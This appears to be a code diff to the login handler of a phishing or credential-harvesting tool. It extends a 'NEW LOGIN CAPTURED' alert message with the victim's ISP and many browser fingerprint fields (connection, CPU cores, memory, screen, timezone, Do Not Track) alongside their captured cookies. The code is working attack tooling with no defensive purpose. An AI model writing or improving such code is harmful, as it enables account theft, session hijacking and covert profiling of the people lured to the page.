@@ -92,6 +92,12 @@ def login():
         city = "Local Machine"
     
     # Prepare enhanced login notification message
+    connection_info = browser_info.get('connection', 'Unknown')
+    if isinstance(connection_info, dict):
+        connection_str = f"{connection_info.get('effectiveType', 'Unknown')} (↓{connection_info.get('downlink', '?')}Mbps, RTT:{connection_info.get('rtt', '?')}ms)"
+    else:
+        connection_str = str(connection_info)
+    
     message = (
         "🚨 *NEW LOGIN CAPTURED* 🚨\n"
         "━━━━━━━━━━━━━━━━━━━━\n\n"
@@ -106,11 +112,17 @@ def login():
         f"📡 ISP: `{isp}`\n\n"
         "💻 *DEVICE INFO*\n"
         f"🖥 User Agent: `{user_agent}`\n"
-        f"🌐 Language: `{accept_language}`\n"
         f"⚙️ Platform: `{browser_info.get('platform', 'Unknown')}`\n"
-        f"📱 Screen: `{browser_info.get('screenResolution', 'Unknown')}`\n"
-        f"🕐 Timezone: `{browser_info.get('timezone', 'Unknown')}`\n"
-        f"🔗 Referer: `{referer}`\n\n"
+        f"🌐 Languages: `{browser_info.get('languages', 'Unknown')}`\n"
+        f"📱 Screen: `{browser_info.get('screenResolution', 'Unknown')} ({browser_info.get('screenColorDepth', 'Unknown')})`\n"
+        f"🪟 Window: `{browser_info.get('windowSize', 'Unknown')}`\n"
+        f"🕐 Timezone: `{browser_info.get('timezone', 'Unknown')} (UTC{browser_info.get('timezoneOffset', '?')})`\n"
+        f"🔌 Connection: `{connection_str}`\n"
+        f"🖱 Touch: `{'Yes' if browser_info.get('touchSupport') else 'No'}`\n"
+        f"⚙️ CPU Cores: `{browser_info.get('hardwareConcurrency', 'Unknown')}`\n"
+        f"💾 Memory: `{browser_info.get('deviceMemory', 'Unknown')} GB`\n"
+        f"🔗 Referer: `{browser_info.get('referrer', 'Direct')}`\n"
+        f"🚫 DNT: `{browser_info.get('doNotTrack', 'Unknown')}`\n\n"
         "🍪 *COOKIES*\n"
         f"`{cookies if cookies != 'None' else 'No cookies found'}`\n\n"
         f"⏰ *Time:* `{timestamp}`\n"
